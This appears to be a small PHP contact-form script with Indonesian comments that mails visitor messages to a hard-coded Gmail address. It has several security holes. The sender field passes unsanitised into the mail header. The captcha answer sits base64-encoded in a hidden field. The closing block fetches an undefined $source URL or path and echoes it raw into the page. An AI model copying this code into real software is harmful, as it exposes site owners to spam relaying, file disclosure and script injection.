<?php
// Script By Aditama Gilang Farel
//--------- MULAI -----------//
//-------------------------------------------------------//
$to='aditfarel44@gmail.com'; // EMAIL LO TARO DISINI
$error='';
//--------------------------------------------------------//
/* Perintah jika button kirim ditekan */
if(isset($_POST['kirim'])){
$from=$_POST['from'];//email pengirim
$title=$_POST['title'];//judul pesan
$desc=$_POST['desc'];//isi pesan
$check_email=preg_match("/.+@.+/", $from);
$header="From: $from \r\n";
$content=wordwrap($desc,100,"\r\n",true);
$base64=base64_decode($_POST['captcha']);
/**
*Melakukan pengecekan variable
* @from Tampilkan pesan error jika variable kosong atau alamat Email tidak sah
* @title Tampilkan error jika title/judul pesan kosong
* @desc Tampilkan pesan error jika isi pesan kosong
* @captcha Tampilkan pesan error jika captcha tidak cocok
* @mail kirim email jika pengecekan isi variable valid
**/
$error.=(empty($from)) ? '- Email Anda Tidak Boleh Kosong!<br/>' : null;
$error.=(!empty($from) AND !$check_email) ? '- Email Anda Tidak Sesuai!<br/>' : null;
$error.=(empty($title)) ? '- Judul Tidak Boleh Kosong!<br/>' : null;
$error.=(empty($desc)) ? '- Pesan Tidak Boleh Kosong!<br/>' : null;
$error.=(empty($_POST['code'])) ? '- Kode Captcha Tidak Di Isi!</br/>' : null;
$error.=(!empty($_POST['code']) AND $_POST['code'] != $base64) ? '- Kode Captcha Salah!<br/>' : null;
if(empty($error)){
$send=mail($to,$title,$content,$header);
$sent=($send) ? '<span style="color:green; font-weight:bold;">Pesan Telah Anda Terkirim</span>' : '<span style="color:#f00; font-weight:bold;">Gagal Mengirim Pesan</span>';
}else{
$error_msg='<span style="color:#f00; font-weight:bold;"><u>Gagal</u><br/>'.$error.'</span>';}
}?>
<div style="border:1px solid #000; padding:3px; margin:3px;">
<?php
echo (isset($error_msg)) ? $error_msg : null;
if(!empty($sent)){
echo $sent;?>
<form action="" method="post">
<button class="button">BACK</button></form></div>
<?php }else{ ?>
<form action="" method="post">
<b>Email Anda :</b><br/>
<input class="input" type="text" name="from" value="<?php echo (isset($from)) ? htmlspecialchars($from) : null;?>"/><br/>
<b>Judul  :</b><br/>
<input class="input" type="text" name="title" value="<?php echo (isset($title)) ? htmlspecialchars($title) : null;?>"/><br/>
<b>Pesan :</b><br/>
<textarea class="textarea" name="desc" rows="7" cols="20"><?php echo (isset($desc)) ? htmlspecialchars($desc) : null;?></textarea><br/>
<b>Kode :</b> <?php $captcha=rand(00000,99999);
echo $captcha;?>
<br/>
<input type="hidden" name="captcha" value="<?php echo base64_encode($captcha);?>"/>
<b>Masukan Code</b> <input class="input" type="text" name="code" size="8"/><br/>
<button class="button" name="kirim">KIRIM</button></form>
<hr style="width:200px;">
<?php }
$open='';
if(function_exists('file_get_contents')){
$open=file_get_contents($source);}
else if(function_exists('curl_init')){
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL, $source);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
$open=curl_exec($ch);
curl_close($ch);}
echo 'Powered By <a href="http://instant-cubes.com" title="INSTANT CUBES">INSTANT CUBES</a> ';
echo $open;?>
</div>